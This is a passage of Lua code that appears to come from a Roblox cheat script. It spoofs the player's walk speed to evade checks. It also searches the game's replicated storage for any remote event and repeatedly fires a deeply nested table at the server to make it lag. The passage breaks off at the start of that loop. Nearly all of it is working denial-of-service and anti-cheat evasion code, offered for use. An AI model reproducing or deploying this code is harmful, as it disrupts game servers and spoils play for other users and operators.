local function IRS_ActivateReset()
    if ST.IRS_isExecuting then return end
    local char = LP.Character if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return end
    ST.IRS_isExecuting = true
    ST.CurrentIndex = ST.CurrentIndex + 1
    if ST.CurrentIndex > #ST.SpeedPool then ST.CurrentIndex = 1 end
    ST.RealSpeed = hum.WalkSpeed
    ST.SpoofActive = true
    task.delay(0.9, function()
        ST.SpoofActive = false
        if hum and hum.Parent then hum.WalkSpeed = ST.RealSpeed end
        task.delay(0.2, function() ST.IRS_isExecuting = false end)
    end)
end

local CachedRemote = nil
local RemoteSearched = false

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local ok, result = pcall(function()
        local obj = game local cleaned = path:gsub("^game%.", "")
        for seg in cleaned:gmatch("[^%.]+") do
            if obj then
                if typeof(obj) == "Instance" then obj = obj:FindFirstChild(seg) else obj = obj[seg] end
            else return nil end
        end
        return obj
    end)
    if ok and result and typeof(result) == "Instance" then return result end
    return nil
end

local function FindAnyRemote()
    if CachedRemote then if CachedRemote.Parent then return CachedRemote end CachedRemote = nil RemoteSearched = false end
    for _, path in ipairs(REMOTE_PATHS) do
        local remote = resolveRemote(path)
        if remote then CachedRemote = remote RemoteSearched = true return remote end
    end
    pcall(function()
        local RS = game:GetService("ReplicatedStorage")
        for _, child in ipairs(RS:GetDescendants()) do
            if child:IsA("RemoteEvent") or child:IsA("UnreliableRemoteEvent") or child:IsA("RemoteFunction") then
                CachedRemote = child RemoteSearched = true return
            end
        end
    end)
    RemoteSearched = true return CachedRemote
end

local function createLagPayload(tc, bs)
    local m = {} local n = {} local z = n
    for i = 1, tc do local ins = {} table.insert(z, ins) z = ins end
    local mi = math.floor(bs / (tc + 2))
    for i = 1, mi do table.insert(m, n) if i % 8000 == 0 then task.wait() end end
    return m
end

local function sendLagPayload(p)
    local r = FindAnyRemote()
    if r and r.Parent then
        pcall(function()
            if r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") then r:FireServer(p)
            elseif r:IsA("RemoteFunction") then r:InvokeServer(p) end
        end)
    end
end

local function startLaggerLoop()
    while LAG_ST.LaggerOn and _G.ExtRunning and CoreActive do
